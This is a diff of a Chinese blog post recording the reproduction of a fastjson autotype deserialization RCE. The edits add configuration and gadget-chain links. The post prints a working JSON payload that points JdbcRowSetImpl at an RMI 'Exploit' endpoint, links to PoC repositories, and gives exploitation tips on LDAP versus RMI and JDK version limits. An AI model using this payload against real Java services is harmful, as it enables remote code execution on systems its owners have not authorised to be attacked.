@@ -81,18 +81,18 @@
 
 
 
-<meta name="description" content="0x00 关于fastjson反正是阿里巴巴的一个开源json库，java站都爱用，还有比如Jackson、gson什么的，Jackson也有RCE问题。fastjson主要几次问题都在于autotype，其实我也不太懂autotype，可能@type的形式就叫aotutype吧。 0x01 关于反序列化之前的autotype存在反序列化的问题，48版本后又多了个绕过autotype关闭的问题，以">
+<meta name="description" content="0x00 关于fastjson反正是阿里巴巴的一个开源json库，java站都爱用，还有比如Jackson、gson什么的，Jackson也有RCE问题。fastjson主要几次问题都在于autotype，其实我也不太懂autotype，可能@type的形式就叫aotutype吧。关于开关fastjson的autotype以及白名单配置https://github.com/alibaba/fast">
 <meta name="keywords" content="fastjson">
 <meta property="og:type" content="article">
 <meta property="og:title" content="fastjson的RCE漏洞复现记录">
 <meta property="og:url" content="http://yoursite.com/2019/07/13/fastjson的RCE漏洞复现记录/index.html">
 <meta property="og:site_name" content="少女的泪">
-<meta property="og:description" content="0x00 关于fastjson反正是阿里巴巴的一个开源json库，java站都爱用，还有比如Jackson、gson什么的，Jackson也有RCE问题。fastjson主要几次问题都在于autotype，其实我也不太懂autotype，可能@type的形式就叫aotutype吧。 0x01 关于反序列化之前的autotype存在反序列化的问题，48版本后又多了个绕过autotype关闭的问题，以">
+<meta property="og:description" content="0x00 关于fastjson反正是阿里巴巴的一个开源json库，java站都爱用，还有比如Jackson、gson什么的，Jackson也有RCE问题。fastjson主要几次问题都在于autotype，其实我也不太懂autotype，可能@type的形式就叫aotutype吧。关于开关fastjson的autotype以及白名单配置https://github.com/alibaba/fast">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-07-19T05:55:31.790Z">
+<meta property="og:updated_time" content="2019-07-29T04:18:56.291Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="fastjson的RCE漏洞复现记录">
-<meta name="twitter:description" content="0x00 关于fastjson反正是阿里巴巴的一个开源json库，java站都爱用，还有比如Jackson、gson什么的，Jackson也有RCE问题。fastjson主要几次问题都在于autotype，其实我也不太懂autotype，可能@type的形式就叫aotutype吧。 0x01 关于反序列化之前的autotype存在反序列化的问题，48版本后又多了个绕过autotype关闭的问题，以">
+<meta name="twitter:description" content="0x00 关于fastjson反正是阿里巴巴的一个开源json库，java站都爱用，还有比如Jackson、gson什么的，Jackson也有RCE问题。fastjson主要几次问题都在于autotype，其实我也不太懂autotype，可能@type的形式就叫aotutype吧。关于开关fastjson的autotype以及白名单配置https://github.com/alibaba/fast">
 
 
 
@@ -381,11 +381,12 @@
       
 
       
-        <h2 id="0x00-关于fastjson"><a href="#0x00-关于fastjson" class="headerlink" title="0x00 关于fastjson"></a>0x00 关于fastjson</h2><p>反正是阿里巴巴的一个开源json库，java站都爱用，还有比如Jackson、gson什么的，Jackson也有RCE问题。fastjson主要几次问题都在于autotype，其实我也不太懂autotype，可能@type的形式就叫aotutype吧。</p>
-<h2 id="0x01-关于反序列化"><a href="#0x01-关于反序列化" class="headerlink" title="0x01 关于反序列化"></a>0x01 关于反序列化</h2><p>之前的autotype存在反序列化的问题，48版本后又多了个绕过autotype关闭的问题，以至于不管你开没开起auto type，使用@type都可以触发反序列化，目前的修复方案好像也只是优化了黑名单，并没有从本质上解决这个问题。<br>目前出问题的是java.lang.Class可以构造出其他的反序列化利用链，而因为种种问题参考<a href="https://bithack.io/forum/393" target="_blank" rel="noopener">fastjson漏洞分析</a>可以绕过黑名单和checkautotype的校验。</p>
+        <h2 id="0x00-关于fastjson"><a href="#0x00-关于fastjson" class="headerlink" title="0x00 关于fastjson"></a>0x00 关于fastjson</h2><p>反正是阿里巴巴的一个开源json库，java站都爱用，还有比如Jackson、gson什么的，Jackson也有RCE问题。fastjson主要几次问题都在于autotype，其实我也不太懂autotype，可能@type的形式就叫aotutype吧。<br>关于开关fastjson的autotype以及白名单配置<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/wiki/enable_autotype</a></p>
+<h2 id="0x01-关于反序列化"><a href="#0x01-关于反序列化" class="headerlink" title="0x01 关于反序列化"></a>0x01 关于反序列化</h2><p>之前的autotype存在反序列化的问题，48版本后又多了个绕过autotype黑名单校验的问题，以至于只要开启autotype，使用@type都可以触发反序列化，目前的修复方案好像也只是优化了黑名单，并没有从本质上解决这个问题。<br>目前出问题的是java.lang.Class可以构造出其他的反序列化利用链，而因为种种问题参考<a href="https://bithack.io/forum/393" target="_blank" rel="noopener">fastjson漏洞分析</a>可以绕过黑名单和checkautotype的校验。</p>
 <h2 id="0x02-payload"><a href="#0x02-payload" class="headerlink" title="0x02 payload"></a>0x02 payload</h2><p><code>{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}}}</code><br>本次利用的形式如上，后面的利用链可以更换成以前的其他类似的payload均可以，因此有很多种变种。<br>将下面这个github里的历史payload改造成上面这种就好了<a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc" title="github历史payload" target="_blank" rel="noopener">github历史payload</a></p>
-<h2 id="0x03-一些利用"><a href="#0x03-一些利用" class="headerlink" title="0x03 一些利用"></a>0x03 一些利用</h2><p>利用的思路可以看看这个文章<a href="https://www.cnblogs.com/hac425/p/9800288.html" target="_blank" rel="noopener">fastjson利用总结</a>，思路是差不多的，具体payload参考上面那个github改一改，这文章里有个直接执行命令的利用方法可以关注一下（意思是不需要搭建rmi和ldap的那种）</p>
-<h2 id="0x04-利用的时候一些重点注意事项"><a href="#0x04-利用的时候一些重点注意事项" class="headerlink" title="0x04 利用的时候一些重点注意事项"></a>0x04 利用的时候一些重点注意事项</h2><ol>
+<h2 id="0x03-一些利用"><a href="#0x03-一些利用" class="headerlink" title="0x03 一些利用"></a>0x03 一些利用</h2><p>利用的思路可以看看这个文章<a href="https://www.cnblogs.com/hac425/p/9800288.html" target="_blank" rel="noopener">fastjson利用总结</a>，思路是差不多的，具体payload参考上面那个github改一改，这文章里有个直接执行命令的利用方法可以关注一下（意思是不需要搭建rmi和ldap的那种）<br>新增：</p>
+<ol>
+<li>fastjson\&lt;1.2.58版本的新的利用链<a href="https://github.com/mikuKeeper/CVE-2019-12384" target="_blank" rel="noopener">https://github.com/mikuKeeper/CVE-2019-12384</a>该利用链同样适用于Jackson，不如说本来也就是Jackson那边爆出来的<h2 id="0x04-利用的时候一些重点注意事项"><a href="#0x04-利用的时候一些重点注意事项" class="headerlink" title="0x04 利用的时候一些重点注意事项"></a>0x04 利用的时候一些重点注意事项</h2></li>
 <li>利用的时候其实会受到目标使用的jdk版本影响，如果要绕过jdk版本的话需要利用的绕过方法也受到目标是否存在对应利用链的问题</li>
 <li>利用的时候ldap和rmi其实一定程度上是等价的，建议使用ldap</li>
 <li>利用的时候ldap能收到目标发送的请求但是没有通过reference请求到web服务获取exploit.class的原因就是前面说的jdk版本问题</li>
